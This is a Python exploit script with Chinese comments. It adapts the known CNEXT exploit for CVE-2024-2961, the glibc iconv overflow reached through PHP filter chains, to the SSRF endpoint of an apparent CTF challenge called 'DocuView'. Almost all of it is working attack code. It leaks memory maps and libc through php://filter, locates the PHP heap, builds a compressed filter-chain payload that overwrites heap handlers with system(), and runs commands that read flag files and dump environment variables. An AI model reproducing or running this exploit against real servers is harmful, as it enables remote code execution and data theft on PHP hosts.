#!/usr/bin/env python3
"""
DocuView CVE-2024-2961 完整版 Exploit
基于原有的CVE-2024-2961利用代码，适配DocuView题目的SSRF入口点

使用方法:
python exp_complete.py http://localhost:8080
"""

import requests
import base64
import sys
import re
import time
import struct
import zlib
from urllib.parse import urljoin, quote
from pathlib import Path
from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

try:
    from pwn import *
    from ten import *
except ImportError:
    print("[!] 缺少依赖库，请安装: pip install pwntools ten")
    sys.exit(1)


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """定制的Remote类，用于通过SSRF发送payload"""
    
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.preview_url = urljoin(self.base_url + '/', 'preview.php')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def send(self, payload):
        """通过SSRF发送payload"""
        try:
            data = {
                'url': payload,
                'format': 'text',
                'quality': 'high'
            }
            
            response = self.session.post(self.preview_url, data=data, timeout=30)
            
            # 提取响应内容
            if response.status_code == 200:
                return response.text
            else:
                return None
                
        except Exception as e:
            print(f"[!] 发送payload失败: {e}")
            return None
    
    def download(self, path):
        """通过SSRF下载文件"""
        try:
            # 使用base64编码来确保二进制文件的完整性
            filter_path = f"php://filter/convert.base64-encode/resource={path}"
            
            data = {
                'url': filter_path,
                'format': 'text', 
                'quality': 'high'
            }
            
            response = self.session.post(self.preview_url, data=data, timeout=30)
            
            if response.status_code == 200:
                # 提取base64编码的内容
                content_match = re.search(r'<div class="text-content"[^>]*>([^<]+)</div>', response.text, re.DOTALL)
                if content_match:
                    encoded_content = content_match.group(1).strip()
                    try:
                        decoded = base64.b64decode(encoded_content)
                        return decoded
                    except:
                        return None
            
            return None
            
        except Exception as e:
            print(f"[!] 下载文件失败 {path}: {e}")
            return None


@entry
@arg("url", "Target URL (DocuView preview.php)")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """DocuView CVE-2024-2961 Exploit: 通过SSRF利用文件读取原语实现RCE"""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("DOCUVIEW-EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)
        
        print(f"[*] 目标URL: {self.remote.url}")
        print(f"[*] 执行命令: {self.command}")

    def check_vulnerable(self) -> None:
        """检查目标是否可达并支持漏洞利用所需的各种包装器和过滤器"""
        
        print("[*] 开始漏洞检测...")
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("目标不可达")
        
        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() in result

        # 测试data://包装器
        text = tf.random.string(50).encode()
        base64_data = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64_data}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("data://包装器测试失败")
            print("--------------------")
            print(f"期望的测试字符串: {text}")
            print(f"实际获得: {result}")
            print("--------------------")
            failure("data://包装器不工作")

        msg_info("data://包装器正常工作")

        # 测试php://filter包装器
        text = tf.random.string(50)
        base64_data = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64_data}"
        if not check_token(text, path):
            failure("php://filter包装器不工作")

        msg_info("php://filter包装器正常工作")

        # 测试zlib扩展
        text = tf.random.string(50)
        base64_data = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64_data}"

        if not check_token(text, path):
            failure("zlib扩展未启用")

        msg_info("zlib扩展已启用")

        msg_success("漏洞利用前置条件满足")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"正在下载 {path}..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """通过查询/proc/self/maps获取PHP进程的内存区域"""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("无法解析内存映射")

        self.log.info(f"获得 {len(regions)} 个内存区域")
        return regions

    def get_symbols_and_addresses(self) -> None:
        """从文件读取原语获取有用的符号和地址"""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP堆
        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc
        libc = self._get_region(regions, "libc-", "libc.so")
        self.download_file(libc.path, LIBC_FILE)
        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """返回名称匹配给定名称之一的第一个区域"""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("无法定位区域")
        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """将remote_path下载到local_path"""
        data = self.get_file(remote_path)
        Path(local_path).write_bytes(data)

    def find_main_heap(self, regions: list[Region]) -> int:
        # 任何大小超过基础堆大小的匿名RW区域都是候选者
        # 堆位于区域的底部
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("无法在内存中找到PHP的主堆")

        first = heaps[0]

        if len(heaps) > 1:
            heaps_str = ", ".join(map(hex, heaps))
            msg_info(f"潜在堆: {heaps_str} (使用第一个)")
        else:
            msg_info(f"使用 {hex(first)} 作为堆")

        return first

    def run(self) -> None:
        """运行完整的漏洞利用流程"""
        print("[*] 开始DocuView CVE-2024-2961漏洞利用")
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """构建漏洞利用路径 - 与原始CNEXT exploit相同的核心逻辑"""
        
        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # 构建各个步骤的payload
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS
        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        step4_pwn = ptr_bucket(
            0x200000, 0,
            0, 0, ADDR_CUSTOM_HEAP,  # 0x18
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            ADDR_HEAP,  # 0x140
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"命令太长 ({len(COMMAND)})，必须小于 {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            "zlib.inflate", "zlib.inflate",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            "convert.quoted-printable-decode", "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("触发漏洞...")
    def exploit(self) -> None:
        """执行漏洞利用"""
        path = self.build_exploit_path()
        start = time.time()

        try:
            print(f"[*] 发送payload到: {self.remote.url}")
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](可能)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()
        print(f"[*] 漏洞利用完成，命令: {self.command}")


# 辅助函数
def compress(data) -> bytes:
    """返回适用于zlib.inflate的数据"""
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.b64encode(data)
    if not misalign and payload.endswith(b"="):
        raise ValueError(f"Misaligned: {data}")
    return payload


def compressed_bucket(data: bytes) -> bytes:
    """返回大小为0x8000的块，解块后返回数据"""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """模拟quoted-printable-encode"""
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """创建一个0x8000块，在每个步骤运行后显示指针"""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)
    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """构造给定块的分块表示"""
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """内存区域"""
    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


def main():
    """主函数"""
    if len(sys.argv) != 2:
        print("使用方法: python exp_complete.py <target_url>")
        print("示例: python exp_complete.py http://localhost:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("DocuView CVE-2024-2961 完整版漏洞利用工具")
    print("=" * 50)
    
    # 默认尝试获取flag
    commands = [
        "cat /flag",
        "cat /root/flag", 
        "cat /home/*/flag",
        "find / -name '*flag*' 2>/dev/null | head -5 | xargs cat",
        "env | grep -i flag"
    ]
    
    success = False
    for cmd in commands:
        print(f"\n[*] 尝试执行命令: {cmd}")
        try:
            exploit = Exploit(target_url, cmd)
            exploit.run()
            success = True
            break
        except Exception as e:
            print(f"[-] 命令执行失败: {e}")
        time.sleep(1)
    
    if success:
        print("\n[+] 漏洞利用成功!")
        sys.exit(0)
    else:
        print("\n[-] 漏洞利用失败")
        
        # 尝试简单的信息收集
        print("\n[*] 尝试基本信息收集...")
        info_commands = [
            "id",
            "pwd", 
            "ls -la /",
            "ps aux"
        ]
        
        for cmd in info_commands:
            print(f"\n[*] 执行: {cmd}")
            try:
                exploit = Exploit(target_url, cmd)
                exploit.run()
            except Exception as e:
                print(f"[-] 命令执行失败: {e}")
            time.sleep(1)
        
        sys.exit(1)

if __name__ == "__main__":
    # 直接运行示例
    print("[*] DocuView CVE-2024-2961 Complete Exploit")
    print("[*] 使用方法: python exp_complete.py --url http://target:port/preview.php --command 'cat /flag'")
    print("[*] 或者使用ten框架: python exp_complete.py")
    
    # 使用ten框架的入口点
    try:
        Exploit()
    except SystemExit:
        # 如果ten框架失败，尝试使用简单模式
        main()